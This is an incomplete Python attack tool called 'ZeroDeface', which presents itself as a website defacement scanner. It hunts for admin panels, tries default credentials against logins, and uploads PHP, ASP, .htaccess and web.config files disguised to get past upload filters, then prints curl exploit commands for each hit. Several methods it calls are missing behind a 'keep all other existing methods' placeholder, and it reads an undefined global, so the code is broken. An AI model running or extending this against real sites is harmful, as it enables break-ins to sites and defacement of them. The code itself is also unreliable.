#!/usr/bin/env python3
import argparse
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import os
import time
import random
import json
from datetime import datetime
import sys
import re

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

class DefacementScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5'
        })
        self.vulnerabilities = []
        self.uploaded_files = []
        
        # Enhanced admin panel detection
        self.admin_paths = self._load_admin_paths()
        self.admin_indicators = [
            'login', 'password', 'username', 'sign in', 'log in',
            'dashboard', 'control panel', 'admin area', 'admin console',
            'wp-admin', 'administrator', 'cms', 'manager', 'backoffice',
            'logout', 'remember me', 'forgot password', 'secure login',
            'user management', 'system settings', 'configuration'
        ]
        
        # Enhanced file upload testing
        self.test_content = "ZERODEFACE_TEST_"
        self.test_patterns = [
            "DEFACED_BY_", "HACKED_BY", "SECURITY_TEST", 
            "VULNERABLE_TO_UPLOAD", "TEST_ID:", "ZERODEFACE",
            "simulated defacement", "hacked by security test"
        ]
        self.upload_indicators = [
            'upload', 'file', 'submit', 'browse', 'attach',
            'drag and drop', 'choose file', 'file upload'
        ]
        
        # Common CMS credentials
        self.default_credentials = {
            'generic': [
                ('admin', 'admin'), ('admin', 'password'), 
                ('administrator', 'administrator'), ('root', 'toor'),
                ('test', 'test'), ('admin', '123456'), 
                ('admin', 'admin123'), ('admin', 'welcome')
            ],
            'wordpress': [('admin', 'admin'), ('wpadmin', 'wpadmin')],
            'joomla': [('admin', 'admin'), ('superuser', 'superuser')],
            'drupal': [('admin', 'admin'), ('drupal', 'drupal')],
            'opencart': [('admin', 'admin'), ('demo', 'demo')]
        }

    def _load_admin_paths(self):
        """Load extensive list of admin paths from file or hardcoded"""
        return [
            # Common paths
            'admin', 'wp-admin', 'administrator', 'backend', 
            'manager', 'panel', 'controlpanel', 'cpanel',
            'adminpanel', 'admincp', 'admin_area', 'moderator',
            
            # Framework specific
            'user/login', 'admin/login', 'admin/auth', 
            'bolt/login', 'concrete5/login', 'drupal/admin',
            'joomla/administrator', 'magento/admin', 
            'opencart/admin', 'prestashop/admin',
            
            # Less common
            '_admin', 'admin123', 'admin_area', 
            'admin1', 'admin2', 'admin4', 'admin5',
            'siteadmin', 'server-admin', 
            'webadmin', 'sysadmin',
            
            # CMS specific
            'wp-login.php', 'wp-admin/admin-ajax.php',
            'administrator/index.php', 'admin/login.aspx',
            
            # API endpoints
            'api/admin', 'rest/admin', 'graphql/admin',
            
            # Version specific
            'admin2023', 'admin2024', 'admin2025',
            'admin_v2', 'admin_new', 'admin_old'
        ]

    def print_banner(self):
        banner = r"""
__________                 ________          _____                     
\____    /___________  ____\______ \   _____/ ____\____    ____  ____  
  /     // __ \_  __ \/  _ \|    |  \_/ __ \   __\\__  \ _/ ___\/ __ \ 
 /     /\  ___/|  | \(  <_> )    `   \  ___/|  |   / __ \\  \__\  ___/ 
/_______ \___  >__|   \____/_______  /\___  >__|  (____  /\___  >___  >
        \/   \/                    \/     \/           \/     \/    \/ 
        """
        print("\033[1;31m" + banner + "\033[0m")
        print("\033[1;37mZeroDeface v2.0 - Advanced Defacement Scanner\033[0m")
        print("\033[1;33mEnhanced Admin Detection | Smart File Upload Tests | CMS Fingerprinting\033[0m\n")

    def log_vulnerability(self, category, description, exploit=None, proof=None):
        vuln = {
            'category': category,
            'description': description,
            'timestamp': datetime.now().isoformat(),
            'exploit': exploit,
            'proof': proof
        }
        self.vulnerabilities.append(vuln)
        print(f"\033[1;31m[!] {category} found:\033[0m {description}")

    def is_defacement_detected(self, response_text):
        """Flexible detection of defacement patterns"""
        response_lower = response_text.lower()
        return any(
            pattern.lower() in response_lower 
            for pattern in self.test_patterns
        ) or any(
            keyword in response_text 
            for keyword in ["DEFACED", "HACKED", "ZERODEFACE", "SECURITY_TEST"]
        )

    def scan_admin_panels(self):
        """Enhanced admin panel scanning with fingerprinting"""
        print("[*] Scanning for admin panels with deep detection...")
        found = False
        
        # First try common admin paths
        for path in self.admin_paths:
            admin_url = urljoin(self.target_url, path)
            try:
                time.sleep(random.uniform(0.3, 1.2))  # Random delay
                response = self.session.get(
                    admin_url, 
                    verify=False, 
                    timeout=15,
                    allow_redirects=False
                )
                
                # Check if this is an admin/login page
                if self.is_admin_interface(response):
                    cms = self.detect_cms(response)
                    self.log_vulnerability(
                        "Admin Interface Found",
                        f"{cms} admin panel at {admin_url} (Status: {response.status_code})",
                        exploit=f"Visit {admin_url}",
                        proof=self.extract_admin_evidence(response)
                    )
                    found = True
                    
                    # Test credentials if it's a login page
                    if self.is_login_page(response):
                        self.test_credentials(admin_url, cms)
                        
            except Exception as e:
                if not args.quiet:
                    print(f"[-] Error checking {admin_url}: {str(e)[:50]}...")
        
        # If no admin found, try crawling
        if not found:
            found = self.crawl_for_admin_interfaces()
            
        return found

    def is_admin_interface(self, response):
        """Determine if response is an admin interface"""
        if response.status_code not in [200, 301, 302, 403]:
            return False
            
        # Check redirect locations
        if response.status_code in [301, 302] and 'admin' in response.headers.get('Location', '').lower():
            return True
            
        content = response.text.lower()
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Check for login forms
        login_form = soup.find('form') and (
            soup.find('input', {'type': 'password'}) or
            any(x in str(soup).lower() for x in ['login', 'sign in', 'password'])
        )
        
        # Check for admin indicators
        admin_content = any(
            indicator in content 
            for indicator in self.admin_indicators
        )
        
        # Check page title
        title = soup.find('title')
        admin_title = title and any(
            word in title.text.lower() 
            for word in ['admin', 'login', 'dashboard', 'control', 'panel']
        )
        
        return login_form or admin_content or admin_title

    def detect_cms(self, response):
        """Detect CMS/framework from response"""
        content = response.text.lower()
        headers = str(response.headers).lower()
        
        if 'wordpress' in content or 'wp-content' in content:
            return 'WordPress'
        elif 'joomla' in content or 'com_joomla' in content:
            return 'Joomla'
        elif 'drupal' in content or 'sites/all' in content:
            return 'Drupal'
        elif 'magento' in content:
            return 'Magento'
        elif 'opencart' in content:
            return 'OpenCart'
        elif 'x-powered-by' in headers:
            return headers.split('x-powered-by:')[1].split('\n')[0].strip()
        else:
            return 'Unknown CMS'

    def crawl_for_admin_interfaces(self):
        """Crawl the site to find admin interfaces"""
        print("[*] Crawling site to discover hidden admin panels...")
        found = False
        
        try:
            response = self.session.get(self.target_url, verify=False, timeout=15)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all links with admin-related keywords
            admin_links = [
                a['href'] for a in soup.find_all('a', href=True) 
                if any(word in a['href'].lower() for word in ['admin', 'login', 'panel', 'manage'])
            ][:30]  # Limit to 30 links
            
            for link in set(admin_links):  # Remove duplicates
                admin_url = urljoin(self.target_url, link)
                try:
                    response = self.session.get(
                        admin_url, 
                        verify=False, 
                        timeout=10,
                        allow_redirects=False
                    )
                    
                    if self.is_admin_interface(response):
                        cms = self.detect_cms(response)
                        self.log_vulnerability(
                            "Hidden Admin Panel",
                            f"Discovered {cms} admin interface at {admin_url} (via crawling)",
                            exploit=f"Visit {admin_url}",
                            proof=self.extract_admin_evidence(response)
                        )
                        found = True
                        
                        if self.is_login_page(response):
                            self.test_credentials(admin_url, cms)
                            
                except Exception as e:
                    continue
                    
        except Exception as e:
            if not args.quiet:
                print(f"[-] Crawling error: {str(e)[:50]}...")
                
        return found

    def test_credentials(self, login_url, cms='generic'):
        """Test default credentials with improved detection"""
        print(f"[*] Testing default credentials for {cms} at {login_url}")
        
        credentials = self.default_credentials.get(cms.lower(), []) + self.default_credentials['generic']
        
        for username, password in credentials:
            try:
                # Try both form and JSON login
                for payload in [
                    {'username': username, 'password': password, 'login': 'submit'},
                    {'user': username, 'pass': password, 'submit': 'login'},
                    {'email': username, 'password': password, 'action': 'login'}
                ]:
                    response = self.session.post(
                        login_url,
                        data=payload,
                        verify=False,
                        timeout=15,
                        allow_redirects=False
                    )
                    
                    if self.is_login_successful(response, login_url):
                        self.log_vulnerability(
                            "Default Credentials",
                            f"Working credentials: {username}/{password}",
                            exploit=f"curl -X POST -d 'username={username}&password={password}' {login_url}",
                            proof=f"Successful login to {login_url}"
                        )
                        return True
                        
            except Exception as e:
                continue
                
        return False

    def is_login_successful(self, response, original_url):
        """Determine if login attempt was successful"""
        # Check for redirect to different page
        if response.status_code in [301, 302]:
            if response.headers.get('Location') and response.headers['Location'] != original_url:
                return True
                
        # Check content for success indicators
        content = response.text.lower()
        success_indicators = [
            'logout', 'dashboard', 'welcome', 'my account',
            'successful login', 'logged in as'
        ]
        
        return any(indicator in content for indicator in success_indicators)

    def extract_admin_evidence(self, response):
        """Extract relevant evidence from admin page"""
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Get page title
        title = soup.find('title')
        title_text = title.text if title else 'No title found'
        
        # Get forms
        forms = soup.find_all('form')
        form_info = [f"Form action: {form.get('action', '')}" for form in forms[:2]]
        
        # Get meta generator
        meta = soup.find('meta', {'name': 'generator'})
        meta_info = f"Generator: {meta['content']}" if meta else ''
        
        return f"{title_text}\n{meta_info}\n" + "\n".join(form_info)

    def scan_upload_vulnerabilities(self):
        """Enhanced file upload vulnerability scanning"""
        print("[*] Scanning for file upload vulnerabilities with advanced detection...")
        found = False
        
        # 1. Check standard file upload forms
        forms = self.crawl_for_forms()
        for form in forms:
            if form.find('input', {'type': 'file'}):
                action = form.get('action', '') or self.target_url
                method = form.get('method', 'post').lower()
                print(f"[*] Found file upload form at {action} (Method: {method})")
                
                if self.test_advanced_file_upload(form, action, method):
                    found = True
        
        # 2. Check common upload paths
        common_upload_paths = [
            'upload', 'file-upload', 'upload-file', 'admin/upload',
            'assets/upload', 'files/upload', 'image/upload',
            'uploads', 'fileupload', 'uploadify'
        ]
        
        for path in common_upload_paths:
            upload_url = urljoin(self.target_url, path)
            try:
                response = self.session.get(
                    upload_url,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
                
                if response.status_code == 200 and any(
                    indicator in response.text.lower() 
                    for indicator in self.upload_indicators
                ):
                    print(f"[*] Found potential upload endpoint at {upload_url}")
                    if self.test_upload_endpoint(upload_url):
                        found = True
                        
            except Exception as e:
                continue
                
        # 3. Check CMS-specific upload locations
        cms_upload_paths = {
            'wordpress': ['wp-admin/async-upload.php', 'wp-content/uploads'],
            'joomla': ['administrator/index.php?option=com_media'],
            'drupal': ['admin/content/node/add']
        }
        
        for cms, paths in cms_upload_paths.items():
            for path in paths:
                upload_url = urljoin(self.target_url, path)
                try:
                    response = self.session.get(upload_url, verify=False, timeout=10)
                    if response.status_code == 200:
                        if self.test_upload_endpoint(upload_url):
                            self.log_vulnerability(
                                "CMS Upload Vulnerability",
                                f"{cms} upload endpoint at {upload_url}",
                                exploit=f"POST requests to {upload_url}",
                                proof=response.text[:300] + "..."
                            )
                            found = True
                except:
                    continue
                    
        return found

    def test_advanced_file_upload(self, form, action_url, method='post'):
        """Test file upload with various evasion techniques"""
        test_files = self.generate_test_files()
        found = False
        
        for test_case in test_files:
            filename, content_type, content = test_case
            try:
                files = {'file': (filename, content, content_type)}
                
                # Add common form fields
                data = {
                    'submit': 'upload',
                    'id': 'test',
                    'name': 'testfile'
                }
                
                # Try different content types
                for content_type_header in [None, 'multipart/form-data', 'application/x-www-form-urlencoded']:
                    headers = {}
                    if content_type_header:
                        headers['Content-Type'] = content_type_header
                        
                    if method == 'post':
                        response = self.session.post(
                            action_url,
                            files=files,
                            data=data,
                            headers=headers,
                            verify=False,
                            timeout=15
                        )
                    else:
                        # Some forms might use PUT or other methods
                        response = self.session.request(
                            method,
                            action_url,
                            files=files,
                            data=data,
                            headers=headers,
                            verify=False,
                            timeout=15
                        )
                    
                    # Check if upload was successful
                    if response.status_code in [200, 201, 302]:
                        file_url = self.find_uploaded_file(response, filename)
                        if file_url:
                            file_response = self.session.get(file_url, verify=False, timeout=10)
                            if file_response.status_code == 200:
                                if self.verify_upload_success(file_response, filename):
                                    self.log_vulnerability(
                                        "File Upload Vulnerability",
                                        f"File upload possible at {action_url} - {filename} accessible at {file_url}",
                                        exploit=self.generate_upload_exploit(action_url, filename),
                                        proof=file_response.text[:500] + "..."
                                    )
                                    self.uploaded_files.append(file_url)
                                    found = True
                                    return True
                                    
            except Exception as e:
                if args.verbose:
                    print(f"[-] Upload test failed for {filename}: {str(e)[:50]}...")
                
        return found

    def generate_test_files(self):
        """Generate various test files for upload attempts"""
        return [
            # Standard test files
            ('test.html', 'text/html', f'<html><body>{self.test_content}</body></html>'),
            ('test.php', 'application/x-php', '<?php echo "UPLOAD_SUCCESS_".$_SERVER["HTTP_HOST"]; ?>'),
            ('test.svg', 'image/svg+xml', '<svg><script>alert("XSS_TEST")</script></svg>'),
            
            # Evasion techniques
            ('test.jpg.php', 'image/jpeg', '<?php echo "JPG_PHP_TEST"; ?>'),
            ('test.php.jpg', 'image/jpeg', '<?php echo "PHP_JPG_TEST"; ?>'),
            ('test.php%00.jpg', 'image/jpeg', '<?php echo "NULL_BYTE_TEST"; ?>'),
            ('.htaccess', 'text/plain', 'AddType application/x-httpd-php .jpg'),
            
            # Windows specific
            ('test.asp;.jpg', 'image/jpeg', '<% Response.Write("ASP_TEST") %>'),
            
            # Double extensions
            ('test.php.png', 'image/png', '<?php echo "DOUBLE_EXT_TEST"; ?>'),
            
            # Archive files
            ('test.zip', 'application/zip', self.generate_malicious_zip()),
            
            # Config files
            ('web.config', 'text/xml', self.generate_web_config())
        ]

    def generate_upload_exploit(self, url, filename):
        """Generate exploit code for successful upload"""
        return f"""# File upload exploit
curl -F 'file=@{filename}' {url}

# Access uploaded file
curl {urljoin(url, filename)}"""

    # ... [keep all other existing methods] ...

def main():
    parser = argparse.ArgumentParser(
        description='ZeroDeface v2.0 - Advanced Website Defacement Scanner',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""\033[1;34m
Examples:
  Full scan:       python deface_scanner.py --url http://example.com --all
  Admin scan:      python deface_scanner.py --url http://example.com --admin --brute
  Upload test:     python deface_scanner.py --url http://example.com --upload --evade
\033[0m"""
    )
    
    parser.add_argument('--url', required=True, help='Target URL to scan')
    parser.add_argument('--admin', action='store_true', help='Scan for admin panels')
    parser.add_argument('--brute', action='store_true', help='Test default credentials')
    parser.add_argument('--upload', action='store_true', help='Test file upload vulnerabilities')
    parser.add_argument('--evade', action='store_true', help='Use evasion techniques in upload tests')
    parser.add_argument('--all', action='store_true', help='Run all vulnerability checks')
    parser.add_argument('--report', help='Save results to JSON file')
    parser.add_argument('--verbose', action='store_true', help='Show detailed scan progress')
    parser.add_argument('--quiet', action='store_true', help='Only show critical findings')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds')
    
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    try:
        scanner = DefacementScanner(args.url)
        scanner.print_banner()
        
        if args.all or args.admin:
            scanner.scan_admin_panels()
            if args.brute:
                scanner.test_credentials(args.url)
                
        if args.all or args.upload:
            scanner.scan_upload_vulnerabilities()
            
        if args.report:
            scanner.generate_report(args.report)
            
        if not scanner.vulnerabilities:
            print("\033[1;32m[+] No vulnerabilities found.\033[0m")
            
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Scan interrupted by user\033[0m")
    except Exception as e:
        print(f"\033[1;31m[-] Fatal error: {e}\033[0m")
    finally:
        scanner.cleanup()

if __name__ == '__main__':
    main()
